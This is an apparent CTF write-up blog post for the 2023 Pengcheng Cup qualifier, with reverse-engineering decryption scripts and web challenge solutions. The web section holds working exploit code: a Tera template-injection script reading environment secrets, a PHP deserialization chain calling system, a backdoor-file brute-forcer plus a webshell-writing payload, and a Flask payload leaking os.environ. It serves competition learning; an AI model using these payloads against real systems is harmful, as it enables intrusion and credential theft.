

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/g.png">
  <link rel="icon" href="/img/g.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="g0at">
  <meta name="keywords" content="">
  
    <meta name="description" content="第三届“鹏城杯”联邦网络靶场协同攻防演练 Write Up By Hor1zon">
<meta property="og:type" content="article">
<meta property="og:title" content="2023鹏城杯初赛">
<meta property="og:url" content="http://example.com/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/index.html">
<meta property="og:site_name" content="g0at&#39;s Blog">
<meta property="og:description" content="第三届“鹏城杯”联邦网络靶场协同攻防演练 Write Up By Hor1zon">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/mdimg/2023pcb/pcb.jpg">
<meta property="article:published_time" content="2023-11-04T15:31:15.000Z">
<meta property="article:modified_time" content="2023-11-23T16:18:46.009Z">
<meta property="article:author" content="g0at">
<meta property="article:tag" content="鹏城杯">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/mdimg/2023pcb/pcb.jpg">
  
  
  
  <title>2023鹏城杯初赛 - g0at&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/mac.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"rF6DPbqXmz9oaKXSwioOtyuv-gzGzoHsz","app_key":"7WylA7nweHQ3Z3Y3lnez5NTm","server_url":"https://rf6dpbqx.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>g0at&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/wp.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2023鹏城杯初赛"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        g0at
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-11-04 23:31" pubdate>
          2023年11月4日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          33k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          276 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">2023鹏城杯初赛</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="安全编程"><a href="#安全编程" class="headerlink" title="安全编程"></a>安全编程</h2><p><img src="/mdimg/2023pcb/1.png" srcset="/img/loading.gif" lazyload><br>修复文件头即可</p>
<h2 id="BabyRe"><a href="#BabyRe" class="headerlink" title="BabyRe"></a>BabyRe</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python">rand = [<span class="hljs-number">19954</span>,<span class="hljs-number">28965</span>,<span class="hljs-number">14137</span>,<span class="hljs-number">3558</span>,<span class="hljs-number">10069</span>,<span class="hljs-number">31251</span>,<span class="hljs-number">32362</span>,<span class="hljs-number">11940</span>,<span class="hljs-number">3430</span>,<span class="hljs-number">27969</span>,<span class="hljs-number">14847</span>,<span class="hljs-number">11465</span>,<span class="hljs-number">12175</span>,<span class="hljs-number">9021</span>,<span class="hljs-number">27614</span>,<span class="hljs-number">8175</span>,<span class="hljs-number">12050</span>,<span class="hljs-number">16408</span>,<span class="hljs-number">20581</span>,<span class="hljs-number">6478</span>,<span class="hljs-number">17749</span>,<span class="hljs-number">4203</span>,<span class="hljs-number">22364</span>,<span class="hljs-number">2272</span>,<span class="hljs-number">9340</span>,<span class="hljs-number">14232</span>,<span class="hljs-number">10535</span>,<span class="hljs-number">32196</span>,<span class="hljs-number">17981</span>,<span class="hljs-number">4946</span>,<span class="hljs-number">3136</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">7408</span>,<span class="hljs-number">30816</span>,<span class="hljs-number">16101</span>,<span class="hljs-number">12491</span>,<span class="hljs-number">23270</span>,<span class="hljs-number">11421</span>,<span class="hljs-number">6414</span>,<span class="hljs-number">31210</span>,<span class="hljs-number">17404</span>,<span class="hljs-number">16964</span>,<span class="hljs-number">2722</span>,<span class="hljs-number">7641</span>,<span class="hljs-number">15728</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">18922</span>,<span class="hljs-number">7948</span>,<span class="hljs-number">4083</span>,<span class="hljs-number">1228</span>,<span class="hljs-number">17990</span>,<span class="hljs-number">32182</span>,<span class="hljs-number">4095</span>,<span class="hljs-number">27339</span>,<span class="hljs-number">13087</span>,<span class="hljs-number">26345</span>,<span class="hljs-number">8298</span>,<span class="hljs-number">17333</span>,<span class="hljs-number">16156</span>,<span class="hljs-number">24319</span>,<span class="hljs-number">17212</span>,<span class="hljs-number">7238</span>,<span class="hljs-number">19353</span>,<span class="hljs-number">27450</span>,<span class="hljs-number">11454</span>,<span class="hljs-number">19311</span>,<span class="hljs-number">14421</span>,<span class="hljs-number">32423</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">26197</span>,<span class="hljs-number">5994</span>,<span class="hljs-number">11848</span>,<span class="hljs-number">651</span>,<span class="hljs-number">13725</span>,<span class="hljs-number">23939</span>,<span class="hljs-number">28785</span>,<span class="hljs-number">28150</span>,<span class="hljs-number">4071</span>,<span class="hljs-number">25161</span>,<span class="hljs-number">27507</span>,<span class="hljs-number">5174</span>,<span class="hljs-number">15768</span>,<span class="hljs-number">17694</span>,<span class="hljs-number">6008</span>,<span class="hljs-number">18904</span>,<span class="hljs-number">18909</span>,<span class="hljs-number">2574</span>,<span class="hljs-number">14254</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">25837</span>,<span class="hljs-number">770</span>,<span class="hljs-number">28328</span>,<span class="hljs-number">3123</span>,<span class="hljs-number">15246</span>,<span class="hljs-number">22839</span>,<span class="hljs-number">29185</span>,<span class="hljs-number">13185</span>,<span class="hljs-number">26586</span>,<span class="hljs-number">19183</span>,<span class="hljs-number">8514</span>,<span class="hljs-number">24515</span>,<span class="hljs-number">24387</span>,<span class="hljs-number">29031</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">16443</span>,<span class="hljs-number">469</span>,<span class="hljs-number">8968</span>,<span class="hljs-number">29531</span>,<span class="hljs-number">29897</span>,<span class="hljs-number">11963</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">29292</span>,<span class="hljs-number">5124</span>,<span class="hljs-number">517</span>,<span class="hljs-number">9813</span>,<span class="hljs-number">31325</span>,<span class="hljs-number">22409</span>,<span class="hljs-number">8104</span>,<span class="hljs-number">9745</span>,<span class="hljs-number">15735</span>,<span class="hljs-number">25236</span>,<span class="hljs-number">12230</span>,<span class="hljs-number">22338</span>,<span class="hljs-number">9605</span>,<span class="hljs-number">22221</span>,<span class="hljs-number">28720</span>,<span class="hljs-number">22532</span>,<span class="hljs-number">4477</span>,<span class="hljs-number">11108</span>,<span class="hljs-number">32554</span>,<span class="hljs-number">541</span>,<span class="hljs-number">5731</span>,<span class="hljs-number">31327</span>,<span class="hljs-number">17262</span>,<span class="hljs-number">17131</span>,<span class="hljs-number">18283</span>,<span class="hljs-number">14387</span>,<span class="hljs-number">5491</span>,<span class="hljs-number">12187</span>,<span class="hljs-number">18782</span>,<span class="hljs-number">2450</span>,<span class="hljs-number">3566</span>,<span class="hljs-number">10652</span>,<span class="hljs-number">13630</span>,<span class="hljs-number">11141</span>,<span class="hljs-number">7578</span>,<span class="hljs-number">10067</span>,<span class="hljs-number">3629</span>,<span class="hljs-number">8634</span>,<span class="hljs-number">21044</span>,<span class="hljs-number">29969</span>,<span class="hljs-number">20107</span>,<span class="hljs-number">7967</span>,<span class="hljs-number">27850</span>,<span class="hljs-number">578</span>,<span class="hljs-number">20575</span>,<span class="hljs-number">23728</span>,<span class="hljs-number">11574</span>,<span class="hljs-number">3815</span>,<span class="hljs-number">5368</span>,<span class="hljs-number">21132</span>,<span class="hljs-number">30438</span>,<span class="hljs-number">19782</span>,<span class="hljs-number">12244</span>,<span class="hljs-number">1871</span>,<span class="hljs-number">13022</span>,<span class="hljs-number">19423</span>,<span class="hljs-number">22720</span>,<span class="hljs-number">27036</span>,<span class="hljs-number">4863</span>,<span class="hljs-number">15267</span>,<span class="hljs-number">26945</span>,<span class="hljs-number">26617</span>,<span class="hljs-number">6793</span>,<span class="hljs-number">26209</span>,<span class="hljs-number">18739</span>,<span class="hljs-number">15072</span>,<span class="hljs-number">4063</span>,<span class="hljs-number">27009</span>,<span class="hljs-number">3760</span>,<span class="hljs-number">5394</span>,<span class="hljs-number">15242</span>,<span class="hljs-number">2292</span>,<span class="hljs-number">21811</span>,<span class="hljs-number">11823</span>,<span class="hljs-number">6273</span>,<span class="hljs-number">11883</span>,<span class="hljs-number">4093</span>,<span class="hljs-number">23428</span>,<span class="hljs-number">22951</span>,<span class="hljs-number">26823</span>,<span class="hljs-number">23480</span>]<br>msg = [<span class="hljs-number">72</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">160</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">49</span>,  <span class="hljs-number">40</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">109</span>, <span class="hljs-number">241</span>,<br>   <span class="hljs-number">33</span>,  <span class="hljs-number">53</span>,  <span class="hljs-number">24</span>, <span class="hljs-number">115</span>, <span class="hljs-number">106</span>,  <span class="hljs-number">76</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">189</span>, <span class="hljs-number">152</span>,<br>  <span class="hljs-number">182</span>,  <span class="hljs-number">90</span>, <span class="hljs-number">119</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">203</span>, <span class="hljs-number">155</span>, <span class="hljs-number">228</span>, <span class="hljs-number">138</span>,<br>   <span class="hljs-number">76</span>, <span class="hljs-number">169</span>,  <span class="hljs-number">92</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">27</span>, <span class="hljs-number">241</span>, <span class="hljs-number">152</span>,  <span class="hljs-number">61</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">89</span>,<br>   <span class="hljs-number">63</span>,  <span class="hljs-number">20</span>, <span class="hljs-number">252</span>, <span class="hljs-number">122</span>, <span class="hljs-number">244</span>, <span class="hljs-number">100</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">43</span>]<br><br><span class="hljs-built_in">dict</span> = &#123;&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-built_in">dict</span>[(<span class="hljs-number">23</span>*(i)+<span class="hljs-number">66</span>)&amp;<span class="hljs-number">0xff</span>]=i<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>)<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(msg),<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        t=msg[ip:ip+<span class="hljs-number">12</span>]<br>        tmp=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t]<br>        data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">4</span>):<br>            data.append(<span class="hljs-built_in">int</span>.from_bytes(tmp[i:i+<span class="hljs-number">4</span>],<span class="hljs-string">&quot;little&quot;</span>))<br>        get = data<br><br>        v23 = get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">4</span>] + v23<br>        v25 = (get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">2</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">5</span>] ^ v25)<br>        data[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">2</span>] + v23<br>        v25 = (get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">1</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">3</span>] ^ v25)<br>        data[<span class="hljs-number">1</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j] + v23<br>        v25 = (get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">1</span>]&lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">0</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">1</span>] ^ v25)<br>        data[<span class="hljs-number">0</span>]&amp;=<span class="hljs-number">0xffffffff</span><br><br><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            i1=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(data[item])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;0&quot;</span>))][::-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                msg[ip+<span class="hljs-number">4</span>*item+i2]=<span class="hljs-built_in">dict</span>[i1[i2]]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(msg))<br></code></pre></td></tr></table></figure>

<h2 id="bad-pe"><a href="#bad-pe" class="headerlink" title="bad_pe"></a>bad_pe</h2><p><img src="/mdimg/2023pcb/2.png" srcset="/img/loading.gif" lazyload><br>这里有个异或0x23，对.ATOM段进行异或，可以恢复程序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad_pe.exe&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>encode = data[<span class="hljs-number">0x2e00</span>:<span class="hljs-number">0x10c00</span>]<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode)):<br>    t.append((encode[i]^<span class="hljs-number">0x23</span>)&amp;<span class="hljs-number">0xff</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.exe&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>        f.write(t[i].to_bytes(<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/2023pcb/3.png" srcset="/img/loading.gif" lazyload><br>rc4加密，调试找到密钥和密文即可<br><img src="/mdimg/2023pcb/4.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h2><p><a target="_blank" rel="noopener" href="https://blog.xinshijiededa.men/writeup/buaactf-2023/">https://blog.xinshijiededa.men/writeup/buaactf-2023/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> socks<br><br>url = <span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span><br><br>string = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&quot;</span><br><br><span class="hljs-comment"># proxy = &#123;&quot;http&quot;: &quot;127.0.0.1:8081&quot;&#125;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br>    data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&#123;% set arr = [__tera_context] %&#125;</span><br><span class="hljs-string">&#123;% set f = get_env(name=&quot;fl&quot;~&quot;ag&quot;) %&#125;</span><br><span class="hljs-string">&#123;%- for char in __tera_context -%&#125;</span><br><span class="hljs-string">    &#123;%- if char == &#x27;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;&#x27; -%&#125;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;%- else -%&#125;</span><br><span class="hljs-string">    &lt;</span><br><span class="hljs-string">    &#123;%- endif -%&#125;</span><br><span class="hljs-string">&#123;% endfor %&#125;&quot;&quot;&quot;</span><br>    res = requests.post(url=url, data=data)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure>

<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hacker</span>&#123;<br>    private $exp;<br>    private $cmd;<br><br>    public  function __toString()<br>    &#123;<br>        call_user_func(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">H</span><br>&#123;<br>    public $username=<span class="hljs-string">&quot;admin&quot;</span>;<br>    public function __destruct()<br>    &#123;<br>        $this-&gt;welcome();<br><br>    &#125;<br>    public  function welcome()<br>    &#123;<br>        echo <span class="hljs-string">&quot;welcome~ &quot;</span>.$this-&gt;username;<br>    &#125;<br>&#125;<br><br><br>$res=new H();<br>$rev = new Hacker();<br>$res-&gt;username=$rev;<br>echo serialize($res);<br>?&gt;<br></code></pre></td></tr></table></figure>

<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5:80/&quot;</span><br>dirs = <span class="hljs-string">&quot;abcdef1234567890&quot;</span><br>exp = <span class="hljs-string">&quot;glob://backdoor_&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dirs:<br>        tmp = exp + i + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;filename&quot;</span>: tmp&#125;<br>        content = requests.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yesyesyes!!!&quot;</span> <span class="hljs-keyword">in</span> content:<br>            exp = exp + i<br>            <span class="hljs-built_in">print</span>(exp)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=<span class="hljs-number">1</span>&amp;title[]=.php&amp;data[]=&lt;?php system(<span class="hljs-string">&#x27;tac /f*&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>:<span class="hljs-number">10000</span>/?username=%7Bpasshash.__str__.__globals__%5Bapp%5D.wsgi_app.__globals__%5Bos%5D.environ%7D&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

